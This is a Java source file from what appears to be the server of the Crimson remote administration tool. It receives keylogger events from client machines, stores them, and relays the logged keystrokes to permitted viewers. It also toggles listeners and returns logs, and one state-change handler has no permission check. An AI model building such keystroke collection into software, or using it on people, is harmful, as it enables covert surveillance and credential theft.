/******************************************************************************
 *                                                                            *
 *                    Copyright 2017 Subterranean Security                    *
 *                                                                            *
 *  Licensed under the Apache License, Version 2.0 (the "License");           *
 *  you may not use this file except in compliance with the License.          *
 *  You may obtain a copy of the License at                                   *
 *                                                                            *
 *      http://www.apache.org/licenses/LICENSE-2.0                            *
 *                                                                            *
 *  Unless required by applicable law or agreed to in writing, software       *
 *  distributed under the License is distributed on an "AS IS" BASIS,         *
 *  WITHOUT WARRANTIES OR CONDITIONS OF ANY KIND, either express or implied.  *
 *  See the License for the specific language governing permissions and       *
 *  limitations under the License.                                            *
 *                                                                            *
 *****************************************************************************/
package com.subterranean_security.crimson.server.exe;

import java.util.Date;

import com.subterranean_security.crimson.core.attribute.keys.singular.AK_SERVER;
import com.subterranean_security.crimson.core.net.Connector;
import com.subterranean_security.crimson.core.net.executor.temp.ExeI;
import com.subterranean_security.crimson.core.net.executor.temp.Exelet;
import com.subterranean_security.crimson.core.store.NetworkStore;
import com.subterranean_security.crimson.core.util.ProtoUtil.PDFactory;
import com.subterranean_security.crimson.proto.core.Misc.Outcome;
import com.subterranean_security.crimson.proto.core.net.sequences.Keylogger.EV_KEvent;
import com.subterranean_security.crimson.proto.core.net.sequences.Keylogger.RQ_KeyUpdate;
import com.subterranean_security.crimson.proto.core.net.sequences.Keylogger.RS_KeyUpdate;
import com.subterranean_security.crimson.proto.core.net.sequences.Log.LogFile;
import com.subterranean_security.crimson.proto.core.net.sequences.Log.LogType;
import com.subterranean_security.crimson.proto.core.net.sequences.Log.RS_Logs;
import com.subterranean_security.crimson.proto.core.net.sequences.MSG.Message;
import com.subterranean_security.crimson.sc.Logsystem;
import com.subterranean_security.crimson.server.store.ListenerStore;
import com.subterranean_security.crimson.sv.permissions.Perm;
import com.subterranean_security.crimson.sv.profile.ClientProfile;
import com.subterranean_security.crimson.sv.store.ProfileStore;
import com.subterranean_security.crimson.universal.Universal;

public class MiscExe extends Exelet implements ExeI {

	public MiscExe(Connector connector) {
		super(connector);
	}

	public void ev_kevent(Message m) {
		try {
			ProfileStore.getClient(connector.getCvid()).getKeylog().addEvent(m.getEvKevent());
		} catch (Exception e) {
			// TODO Auto-generated catch block
			e.printStackTrace();
		}

	}

	public void rq_key_update(Message m) {
		RQ_KeyUpdate rq = m.getRqKeyUpdate();
		Date target = new Date(rq.getStartDate());

		// check permissions
		if (!ProfileStore.getViewer(connector.getCvid()).getPermissions().getFlag(rq.getCid(),
				Perm.client.keylogger.read_logs)) {
			connector.write(Message.newBuilder().setId(m.getId())
					.setRsKeyUpdate(RS_KeyUpdate.newBuilder().setResult(false)).build());
			return;
		}

		ClientProfile cp = ProfileStore.getClient(rq.getCid());
		if (cp != null) {
			for (EV_KEvent k : cp.getKeylog().getEventsAfter(target)) {
				connector.write(Message.newBuilder().setFrom(rq.getCid()).setEvKevent(k).build());
			}
			connector.write(Message.newBuilder().setId(m.getId())
					.setRsKeyUpdate(RS_KeyUpdate.newBuilder().setResult(true)).build());
		} else {
			connector.write(Message.newBuilder().setId(m.getId())
					.setRsKeyUpdate(RS_KeyUpdate.newBuilder().setResult(false)).build());
		}

	}

	public void rq_change_server_state(Message m) {
		// TODO check permissions
		String comment = "";
		boolean result = true;

		switch (m.getRqChangeServerState().getNewState()) {
		case FUNCTIONING_OFF:
			ListenerStore.stopAll();
			break;
		case FUNCTIONING_ON:
			ListenerStore.startAll();
			break;
		case RESTART:
			break;
		case SHUTDOWN:
			break;
		case UNINSTALL:
			break;
		default:
			break;
		}

		connector.write(Message.newBuilder().setId(m.getId())
				.setRsOutcome(Outcome.newBuilder().setResult(result).setComment(comment)));

		// apprise viewers
		NetworkStore.broadcastTo(Universal.Instance.VIEWER,
				new PDFactory(connector.getCvid()).add(AK_SERVER.ACTIVE_LISTENERS, ListenerStore.getActive())
						.add(AK_SERVER.INACTIVE_LISTENERS, ListenerStore.getInactive()).buildMsg());
	}

	public void rq_change_client_state(Message m) {

	}

	public void rq_logs(Message m) {
		RS_Logs.Builder rs = RS_Logs.newBuilder();
		if (m.getRqLogs().hasLog()) {
			rs.addLog(LogFile.newBuilder().setName(m.getRqLogs().getLog())
					.setLog(Logsystem.getLog(m.getRqLogs().getLog())));
		} else {
			for (LogType lt : Logsystem.getApplicableLogs()) {
				rs.addLog(LogFile.newBuilder().setName(lt).setLog(Logsystem.getLog(lt)));
			}
		}
		connector.write(Message.newBuilder().setRsLogs(rs).build());
	}

}
